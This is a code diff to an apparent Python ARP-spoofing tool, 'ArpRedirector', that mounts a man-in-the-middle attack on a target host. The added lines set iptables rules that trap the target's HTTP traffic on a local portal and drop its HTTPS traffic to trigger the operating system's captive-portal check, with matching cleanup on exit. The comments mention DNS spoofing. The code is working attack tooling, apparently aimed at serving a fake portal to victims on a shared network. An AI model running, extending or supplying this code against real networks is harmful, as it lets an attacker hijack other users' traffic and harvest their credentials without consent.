@@ -76,6 +76,23 @@ class ArpRedirector:
             print("⚠️ WARNING: IP Forwarding could not be enabled automatically.")
             print("Run this manually: sudo sysctl -w net.ipv4.ip_forward=1")
             
+        import subprocess
+        try:
+            # 1. Clear any existing rules for this target to avoid duplicates
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)
+            
+            # 2. Force all HTTP traffic to our local portal
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=True)
+            
+            # 3. DROP HTTPS traffic (Forces the OS to trigger a Captive Portal check)
+            # We drop in both FORWARD (for normal routing) and INPUT (for DNS-spoofed local hits)
+            subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=True)
+            subprocess.run(["sudo", "iptables", "-A", "INPUT", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=True)
+            
+            print("🔥 Aggressive MitM Active: HTTP trapped, HTTPS blackholed. Triggering OS auto-checks...")
+        except Exception as e:
+            logger.error(f"Failed to set aggressive rules: {e}")
+
         self.running = True
         self.thread = threading.Thread(target=self._poison, daemon=True)
         self.thread.start()
@@ -97,6 +114,14 @@ class ArpRedirector:
         sendp(res_target, count=5, verbose=False, iface=self.interface)
         sendp(res_gateway, count=5, verbose=False, iface=self.interface)
         
+        import subprocess
+        try:
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "-s", self.target_ip, "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], check=False)
+            subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=False)
+            subprocess.run(["sudo", "iptables", "-D", "INPUT", "-p", "tcp", "-s", self.target_ip, "--dport", "443", "-j", "DROP"], check=False)
+        except:
+            pass
+
         print("✅ Network restored.")
         sys.exit(0)
 
